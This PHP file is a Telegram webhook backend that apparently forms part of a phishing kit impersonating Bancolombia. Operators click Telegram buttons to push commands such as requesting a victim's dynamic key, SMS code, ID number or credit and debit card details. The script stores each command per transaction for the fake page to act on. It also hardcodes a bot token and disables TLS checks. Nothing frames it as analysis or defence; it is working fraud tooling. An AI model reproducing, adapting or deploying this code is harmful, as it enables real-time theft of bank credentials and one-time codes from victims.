<?php
/**
 * Telegram Webhook Endpoint for BANCOL_NUEVO_AUMENTO
 */
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

$localConfig = [];
if (file_exists(__DIR__ . '/tarjeta/config.php')) {
    $localConfig = @include __DIR__ . '/tarjeta/config.php';
} elseif (file_exists(__DIR__ . '/inicio/b-14/config.php')) {
    $localConfig = @include __DIR__ . '/inicio/b-14/config.php';
}
$bot_token = $localConfig['bot_token'] ?? '9267081280:AAG5QoLRfR17bSDYV81QmLyBAEI5v22iRtw';
$actions_dir = __DIR__ . '/inicio/b-14/actions';
$local_action_dirs = [
    $actions_dir,
    __DIR__ . '/actions',
    '/var/www/trico-villa/actions',
    '/var/www/trico-villa/inicio/b-14/actions',
    dirname(__DIR__) . '/actions',
    '/var/www/html/actions',
    '/var/www/joker/actions'
];

function normalizeAction($action)
{
    $action = trim((string) $action);
    if ($action === '') {
        return '';
    }

    $action = strtolower($action);
    $action = preg_replace('/[^a-z0-9]+/', '_', $action);
    $action = trim($action, '_');

    $aliases = [
        'dinamica_logo' => 'pedir_dinamica',
        'dinamica' => 'pedir_dinamica',
        'pedir_dinamica' => 'pedir_dinamica',
        'pedir_sms' => 'pedir_sms',
        'sms' => 'pedir_sms',
        'cara' => 'error',
        'cedula' => 'cedula',
        'error_logo' => 'error_logo',
        'error_tc' => 'error_tc',
        'pedir_credito' => 'pedir_credito',
        't_credito' => 'pedir_credito',
        'pedir_debito' => 'pedir_debito',
        't_debito' => 'pedir_debito',
        'error_token' => 'error_token',
        'confirm_finalizar' => 'confirm_finalizar',
        'bre_b' => 'bre_b',
        'breb' => 'bre_b',
        '923' => '923'
    ];

    return $aliases[$action] ?? $action;
}

function writeActionPayload($dirs, $transactionId, $normalizedAction, $actionType, $chatId, $from)
{
    if ($transactionId === '' || $transactionId === null) {
        return;
    }

    $safeTxId = preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $transactionId);
    if ($safeTxId === '') {
        return;
    }

    $payload = [
        'action' => $normalizedAction,
        'raw_action' => $actionType,
        'transactionId' => $safeTxId,
        'user' => [
            'username' => $from['username'] ?? null,
            'first_name' => $from['first_name'] ?? null,
            'last_name' => $from['last_name'] ?? null,
            'full_name' => trim((($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''))),
        ],
        'chat_id' => $chatId,
        'created_at' => time(),
    ];

    foreach ($dirs as $dir) {
        if (!is_dir($dir)) {
            @mkdir($dir, 0777, true);
        }
        @chmod($dir, 0777);

        $filePath = $dir . '/' . $safeTxId . '.txt';
        file_put_contents($filePath, $normalizedAction, LOCK_EX);
        @chmod($filePath, 0666);

        $metaPath = $dir . '/' . $safeTxId . '.meta.json';
        file_put_contents($metaPath, json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT), LOCK_EX);
        @chmod($metaPath, 0666);
    }
}

if (!is_dir($actions_dir)) {
    @mkdir($actions_dir, 0777, true);
}
@chmod($actions_dir, 0777);

$content = file_get_contents('php://input');
file_put_contents(__DIR__ . '/webhook_log.txt', date('Y-m-d H:i:s') . " - DATA: " . $content . "\n", FILE_APPEND);

$update = json_decode($content, true);

if (!$update) {
    http_response_code(200);
    exit('OK');
}

if (isset($update['callback_query'])) {
    $cb = $update['callback_query'];
    $callbackQueryId = $cb['id'] ?? '';
    $cbData = $cb['data'] ?? '';
    $message = $cb['message'] ?? [];
    $chatId = $message['chat']['id'] ?? '';
    $messageId = $message['message_id'] ?? '';
    $from = $cb['from'] ?? [];

    $actionType = '';
    $transactionId = '';

    if (is_string($cbData) && strpos($cbData, ':') !== false) {
        [$actionType, $transactionId] = explode(':', $cbData, 2);
    } elseif (is_string($cbData) && strpos($cbData, '|') !== false) {
        [$actionType, $transactionId] = explode('|', $cbData, 2);
    } else {
        $actionType = is_string($cbData) ? $cbData : '';
    }

    if ($actionType !== '') {
        $normalizedAction = normalizeAction($actionType);

        if ($transactionId !== '') {
            writeActionPayload($local_action_dirs, $transactionId, $normalizedAction, $actionType, $chatId, $from);
            file_put_contents(__DIR__ . '/webhook_log.txt', date('Y-m-d H:i:s') . " - ACTION SAVED: " . $actions_dir . '/' . preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $transactionId) . '.txt' . " -> " . $normalizedAction . "\n", FILE_APPEND);
        }

        $answerPayload = [
            'callback_query_id' => $callbackQueryId,
            'text' => 'Enviado: ' . $actionType,
            'show_alert' => false
        ];

        $chAns = curl_init("https://api.telegram.org/bot{$bot_token}/answerCallbackQuery");
        curl_setopt_array($chAns, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($answerPayload),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_TIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
        ]);
        curl_exec($chAns);
        curl_close($chAns);

        $origText = $message['text'] ?? '';
        $nombre = trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
        $operador = !empty($from['username']) ? '@' . $from['username'] : ($nombre ?: 'Operador');

        $newText = $origText . "\n\n————————————\n✅ <b>Comando:</b> {$actionType}\n👤 <b>Operador:</b> {$operador}";

        $editPayload = [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$bot_token}/editMessageText");
        curl_setopt_array($chEdit, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($editPayload),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_TIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
        ]);
        curl_exec($chEdit);
        curl_close($chEdit);
    }
}

http_response_code(200);
echo json_encode(['status' => 'ok']);
